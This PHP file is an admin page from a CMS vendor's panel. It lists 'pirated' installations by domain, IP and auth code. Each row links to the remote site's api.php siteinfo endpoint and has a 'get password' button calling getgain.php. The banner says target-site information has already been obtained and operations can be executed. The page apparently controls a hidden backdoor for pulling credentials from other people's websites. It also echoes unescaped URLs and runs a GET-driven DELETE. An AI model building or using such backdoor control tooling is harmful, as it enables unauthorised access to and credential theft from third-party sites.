<?php
include '../includes/common.php';
include 'header.php';
include 'nav.php';
$numrows=$DB->count("SELECT count(*) from ku_piracy");

$pagesize=20;
$pages=intval($numrows/$pagesize);
if ($numrows%$pagesize)
{
 $pages++;
 }
if (isset($_GET['page'])){
$page=intval($_GET['page']);
}
else{
$page=1;
} 
$offset=$pagesize*($page - 1);
$sql = "SELECT * FROM ku_piracy  order by date desc limit $offset,$pagesize";

if($_GET['my']=='delpirate'){
  $url=daddslashes($_GET['url']);
  $sql="DELETE FROM ku_piracy WHERE url='$url' limit 1";
  if($DB->query($sql)){
 @header('Content-Type: text/html; charset=UTF-8');
        exit("<script language='javascript'>alert('删除盗版数据成功！');history.go(-1);</script>");

  }else{
@header('Content-Type: text/html; charset=UTF-8');
        exit("<script language='javascript'>alert('删除盗版数据失败！');history.go(-1);</script>");

  }
}
?>
  <div class="alert alert-info fade in">
                      <i class="icon-remove close" data-dismiss="alert">
                      </i>
                     关于盗版列表：以下盗版已经获取到目标网站相关信息，可以执行操作。<br>
                    </div>      
<div class="row">
            <div class="col-md-12">
              <div class="white-box">
                  <h2 class="header-title">盗版列表</h2>
                <div class="table-wrap">
                            <table class="table">
                    <thead>
                      <tr>
                        <th>域名</th>
                        <th>入库时间</th>
                        <th>目标IP</th>
                        <th>类型</th>
                        <th>操作</th>
                      </tr>
                    </thead>
                    <tbody>
                       <?php

$rs=$DB->query($sql);
while($res = $DB->fetch($rs))
{
$type='<font color="orange">正常</font>';
$url=urlencode('http://'.$res['url'].'/');
echo '<tr>
<td><a href="/jump.php?url='.urlencode('http://'.$res['url'].'/').'" target="_blank">'.$res['url'].'</a>&nbsp;<a href="/jump.php?url='.urlencode('http://'.$res['url'].'/api.php?my=siteinfo').'" target="_blank">[*]</a></td>
<td>'.$res['date'].'</td>
<td>'.$res['ip'].'</td>
<td onclick="alert(\'授权码：'.$res['authcode'].'\')">'.$type.'</td>
<td><a href="./getgain.php?url='.$url.'&m=1" class="btn btn-xs btn-primary">获取密码</a> <a href="?my=delpirate&url='.$res['url'].'" class="btn btn-xs btn-danger" onclick="return confirm(\'你确实要删除此条记录吗？\');">删除</a></td>
</tr>';
}
?>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
            </div>

<div class="row">
<div class="dataTables_footer clearfix">
<div class="col-md-12">
<div class="dataTables_paginate paging_bootstrap">
              <?php
echo'<ul class="pagination">';
$first=1;
$prev=$page-1;
$next=$page+1;
$last=$pages;
if ($page>1)
{
echo '<li class="prev disabled"><a href="?page='.$first.$link.'">首页</a></li>';
echo '<li><a href="?page='.$prev.$link.'">&laquo;</a></li>';
} else {
echo '<li><a>首页</a></li>';
echo '<li ><a>&laquo;</a></li>';
}
for ($i=1;$i<$page;$i++)
echo '<li><a href="?page='.$i.$link.'">'.$i .'</a></li>';
echo '<li ><a>'.$page.'</a></li>';
for ($i=$page+1;$i<=$pages;$i++)
echo '<li><a href="?page='.$i.$link.'">'.$i .'</a></li>';
echo '';
if ($page<$pages)
{
echo '<li><a href="?page='.$next.$link.'">&raquo;</a></li>';
echo '<li><a href="?page='.$last.$link.'">尾页</a></li>';
} else {
echo '<li ><a>&raquo;</a></li>';
echo '<li ><a>尾页</a></li>';
}
echo'</ul>';
#分页
           
?>
</div>
</div>
</div>
</div>
</div>
 </div>
        <footer class="footer-main"><a target="_blank" href="http://www.kuxiangcms.com/"><?php echo $conf['copyright'] ?></a></footer>  
       </div>
    <script src="./admin/js/jquery.min.js"></script>
    <script src="./admin/js/bootstrap.min.js"></script>
    <script src="./admin/plugins/moment/moment.js"></script>
    <script  src="./admin/js/jquery.slimscroll.js "></script>
    <script src="./admin/js/jquery.nicescroll.js"></script>
    <script src="./admin/js/functions.js"></script>
    <script src="./admin/plugins/morris-chart/morris.js"></script>
    <script src="./admin/plugins/morris-chart/raphael-min.js"></script>
    <script src="./admin/plugins/jquery-sparkline/jquery.charts-sparkline.js"></script>
</body>
</html>